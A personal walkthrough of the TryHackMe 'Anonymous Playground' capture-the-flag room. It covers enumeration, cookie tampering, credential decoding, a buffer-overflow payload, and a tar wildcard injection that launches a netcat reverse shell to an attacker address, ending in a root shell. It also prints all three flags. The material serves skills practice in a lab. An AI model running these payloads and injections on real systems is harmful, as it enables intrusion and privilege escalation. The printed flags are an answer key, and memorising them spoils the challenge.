<p align="center">April 14, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{343}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/01dc672d-a7c9-425f-b466-64c242f8042c" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/4fe1cc18-807a-4b4f-8db2-7dc5f7c421ba"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Anonymous Playground}}$$</h1>
<p align="center"><em>Want to become part of Anonymous?<br> They have a challenge for you. Can you get the flags and become an operative?</em><br>
 It is classified as a hard-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/anonymousplayground">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/3e02c318-fd48-4130-a5ea-a8f957595d95"> </p>

<br>
<br>

<h2>Task 1 . Prove Yourself </h2>

<p>[  Start Machine  ]</p>

<p>
<em>Also credit goes to Sq00ky for the super special idea found in the initial foothold stage (not going to give any
spoilers away!)</em><br>

Please allow 3-5 minutes for the box to fully deploy once you hit the "Deploy" button.<br>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>User 1 Flag.</em>Hint : <em>You're going to want to write a Python script for this. 'zA' = 'a'</em><br><a id='1.1'></a>
>> <strong><code>9184177ecaa83073cbbf36f1414cc029</code></strong><br>
<p></p>

<br>
<br>

<p>Used <code>nmap</code>.<br>
Discovered:<br>
-  two ports open: <code>22/ssh</code> and  <code>80/http</code>.<br>
-  <code>http-robots.txt: 1 disallowed entry </code>.<br>
-  an endpoint <code>|/zYdHuAKjP</code></br>
-  <code>|_http-title: Proving Grounds</code></p>


```bash
:~/AnonymousPlayground# nmap -sC -sV -sS -Pn -A -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Proving Grounds
...
```

<br>

<p>Used <code>nmap</code> again in order to enumerate http.</p>
Discovered:<br>
-  <code>/robots.txt</code><br>
-  <code>/css/</code></br>
-  <code>/images</code><br>
-  <code>/js</code><br>
</p>

<br>

```bash
:~/AnonymousPlayground# nmap -sV --script=http-enum -A TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

<br>

<p>Added <code>TargetIP</code> and a domain name to <code>etc/hosts</code>.</p>

<br>

<p>Navigated to <code>http://TargetIP</code>.<br>
Discovered a <code>script</code>.</p>
<br>

![image](https://github.com/user-attachments/assets/b777a1cf-20f3-4835-8c68-a2d984221c35)

<br>

<p>Viewed page source.<br>
Discovered an <code>access</code> cookie with a <code>Value</code> field as <code>denied</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/833214d3-dfae-4a01-8cb5-b500aa304e7a)


<br>

<p>Navigated to<code>http://TargetIP/robots.txt</code>.<br>
Confirmed the endpoint discovered in the first nmap.</p>

<br>

![image](https://github.com/user-attachments/assets/0176a7ce-b3b1-4a98-bdd8-540ef0192761)

<br>


<p>Navigated to <code>http://TargetIP/zYdHuAKjP</code>.<br>
Saved <code>granted</code> instead of <code>denied</code> and refreshed the webpage.<br><br>
Discovered something that might have the format <code>user</code>::<code>password</code>.<br><br>
Which user? Which password?<br><br>
Read the hint: <code>You're going to want to write a Python script for this. 'zA' = 'a'</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/4e6dc7dd-1d48-41ce-8a63-79be69dba928)

<br>

```bash
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

<br>

<p>Wrote a script named <code>discovery.py</code>.</p>

```bash
cipher = "zA"
print("Cipher:", cipher)

firstchar  = cipher[0]
secondchar = cipher[1]
needed     = (ord(firstchar)+(ord(secondchar)%65)+1)
print("Needed :", needed) 
a =chr(needed) 
print("Final :",a)

```

<br>

<p>Ran the script.</p>

<br>

![image](https://github.com/user-attachments/assets/1c0e04f0-f149-4b06-8f31-985c2406d0dc)

<br>

<p>Since my Python skills are basic, I changed the previous script to analyze a pair of characters per round.<br>
Ran it.</p>

<br>

```bash
cipher =  input("Hey!  Please entre 2 characters: ")
print("Cipher:", cipher)

firstchar  = cipher[0]
secondchar = cipher[1]
needed     = (ord(firstchar)+(ord(secondchar)%65)+1)
print("Needed :", needed) 
a =chr(needed)
print("Final :",a)
```

<br>


![image](https://github.com/user-attachments/assets/a194b3de-f214-4ba0-9db2-13e542b597b1)


<br>

<p>Identified previously <code>hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN</code>code>.<br><br>
Discovered <code>hE zA dC fH zA</code>  -----  <code>m { g n {<br></code>.<br><br>
Discovered <code>hE zA dC fH zA   hA iJ   zA eI    aD jB cB hH gA zA fH fN</code> ----- <code>m { g n {   i s   { n    e l e p h { n t</code>.<br><br>
I am guessing <code>{</code> is <code>a</code>. <br><br>
Let´s keep analysing!</p>

<br>

<p>Navigated to <code>http://TargetIP/operatives.php</code>.<br>
It looks like name of team members.</p>

<br>

![image](https://github.com/user-attachments/assets/91f5726c-6998-4ea3-9947-a58853750c36)


<br>

<p>Saved it.</p>

```bash
themayor
spooky
darkstar
akaelite
ninja
w0rmer
nameless0ne
0day
szymex
ma1ware
paradox
bee
iamwill
jammy
magna
cryillic
skidy
naughty
thealchemist
itsunda
```

<br>


<p>8:-)<br><br>
There is <code>magna</code> among the list!<br><br>
So ...<code>magna::magnaisanelephant</code>.<br><br>
Credentials!</p>

<br>


![image](https://github.com/user-attachments/assets/91f5726c-6998-4ea3-9947-a58853750c36)

<br>
<br>


<p>Used <code>ssh magna@TargetIP</code> and the password just discovered.</p>

<br>

![image](https://github.com/user-attachments/assets/7bc8af73-57cb-4cf3-a3b7-d44b87df3798)

<br>

```bash
magna@anonymous-playground:~$ id
uid=1001(magna) gid=1001(magna) groups=1001(magna)
magna@anonymous-playground:~$ pwd
/home/magna
magna@anonymous-playground:~$ which python3
/usr/bin/python3
```

<br>

<p>Estabilized the shell.<br>
Tried to proceed with Ctrl Z and more.  Did not allow.</p>

```bash
magna@anonymous-playground:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```


<br>

<p>Discovered the first flag.</p>

<br>

![image](https://github.com/user-attachments/assets/fe1190dd-f8d3-4628-a7ce-19de62bb8fa6)

<br>


```bash
magna@anonymous-playground:~$ ls
flag.txt  hacktheworld  note_from_spooky.txt
magna@anonymous-playground:~$ cat flag.txt
9184177ecaa83073cbbf36f1414cc029
magna@anonymous-playground:~$ 

```

<br>
<br>
<br>



> 1.2. <em>User 2 Flag.</em><br><a id='1.2'></a>
>> <strong><code>69ee352fb139c9d0699f6f399b63d9d7</code></strong><br>
<p></p>

<br>

<p>Discovered user <code>Spooky</code> and that <code>admins</code>  have <code>radare2</code> installed.</p>

<br>

![image](https://github.com/user-attachments/assets/21a5af38-4179-4fb1-a938-258f21dbc0d7)


<br>

<p><code>magna</code> is not a <code>sudoer</code>.  8:-(</p>

<br>

![image](https://github.com/user-attachments/assets/6c17b59b-5397-476d-8ff1-ea0a95bb8d25)


<br>

```bash
magna@anonymous-playground:~$ (python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.

```

<br>

<p>Discovered the second flag.</p>

<br>

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
spooky@anonymous-playground:~$ cd ..
cd ..
spooky@anonymous-playground:/home$ ls
ls
dev  magna  spooky
spooky@anonymous-playground:/home$ cd spooky
cd spooky
spooky@anonymous-playground:/home/spooky$ ls
ls
flag.txt
spooky@anonymous-playground:/home/spooky$ cat flag.txt
cat flag.txt
69ee352fb139c9d0699f6f399b63d9d7
spooky@anonymous-playground:/home/spooky$ 
```

<br>

![image](https://github.com/user-attachments/assets/2ba38b74-058e-43a5-9b27-9537752f1daf)


<br>

<p>Used <code>find / -type f -perm -4000 -ls 2>/dev/null</code> to identifiy files that have the <code>SUID</code> bit set.</p>

<br>

![image](https://github.com/user-attachments/assets/9f47086c-25fd-4e45-a360-ff294f695b2f)

<br>


<br>

> 1.3. <em>Root Flag.</em><br><a id='1.3'></a>
>> <strong><code>bc55a426e98deb673beabda50f24ce66</code></strong><br>
<p></p>

<br>


<p>Set up a server.</p>

<br>

![image](https://github.com/user-attachments/assets/1cd2ea5a-64b7-49d2-8331-c2b8154ffc8e)

<br>

<p>Added <code>linpeas.sh</code> to the <code>Target VM</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/ffc72a58-4e8a-4c85-ae0b-7774609fd657)

<br>

<p>Ran <code>linpeas.sh</code>.

<br><br>

- Discovered<br><br>
- <code>root</code> has an unexpected folder ----- <code>/cdrom</code>.<br><br>
- <code>SGID<code> ----- <code>/usr/bin/at</code> -----<code>CVE-2002-1614</code>.</p>


<br>

![image](https://github.com/user-attachments/assets/5e52f7ed-0934-4143-afe8-d9915f8e5be8)

<br>

<p>- <code>root files in home dirs</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/08606627-5abe-4819-8818-dd6abb4f2554)

<br>

<p>- modified interesting file in the last 5 mins 😃:<br><br> <code>/var/backups/spooky.tgz</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/bdd18f0f-9796-4aa6-a0c1-5862e06fef9d)

<br>

<p>Tried to use <code>tar</code> against <code>spooky.tgz</code>code> without success.<br<br>
Tought ... if we have a <code>spooky</code>´s file modified in the last 5 mins, it might be a crontab.</p>

<br>

![image](https://github.com/user-attachments/assets/9d9f8182-d0ea-4fef-bdda-28bcf8ab36c2)

<br>

![image](https://github.com/user-attachments/assets/5f91749b-d62e-450b-b242-c612e64a1c4c)

<br>


<p>Set up a listener.</p>

<br>

<p>Sent a payload.</p>

<br>

![image](https://github.com/user-attachments/assets/bdeb2d09-c16d-4ad5-9e64-9aca35c7448a)

<br>



```bash
spooky@anonymous-playground:/home/spooky$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.250.20 9000 >/tmp/f' > escalation.sh
spooky@anonymous-playground:/home/spooky$ cat escalation.sh
cat escalation.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.250.20 9000 >/tmp/f
spooky@anonymous-playground:/home/spooky$  echo "" > "--checkpoint-action=exec=sh escalation.sh"
h escalation.sh"eckpoint-action=exec=sh
spooky@anonymous-playground:/home/spooky$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
spooky@anonymous-playground:/home/spooky$ 
```


<br>

![image](https://github.com/user-attachments/assets/cfa9795a-7cfb-4e26-a4b6-46a03d0244ef)

<br>


```bash
root@ip-10-10-250-20:~/AnonymousPlayground# nc -lnvp AttackPort
Listening on 0.0.0.0 AttackPort
Connection received on 10.10.201.47 35812
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/spooky
# ls /root 
flag.txt
# cat /root/flag.txt
bc55a426e98deb673beabda50f24ce66
```


<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/e8927a38-d2c2-4fea-9efb-9cb10bb0ae52"><br>
<img width="900px" src="https://github.com/user-attachments/assets/f6826400-a716-443f-abb2-2d018681d780"></p>


<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| April 14, 2025    | 343      |     286ᵗʰ    |        7ᵗʰ   |    229ᵗʰ    |     3ʳᵈ    |  93,413  |       661 |   59      |

</div>


<br>

<p align="center"> Global All Time: 286ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/117ed2f3-e3b3-4466-a40c-92e1dc294ba6"> </p>

<p align="center"> Brazil All Time: 7ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/e2394d00-62a9-46e1-878b-f1f9aa975ffb"> </p>

<p align="center"> Global monthly: 229ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/eb1cfc2f-4e6b-47ce-934a-e5e6892efaae"> </p>

<p align="center"> Brazil monthly: 3ʳᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/bfc8b012-2531-4b5a-a517-cf8216c5e5ea"> </p>


<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p> 
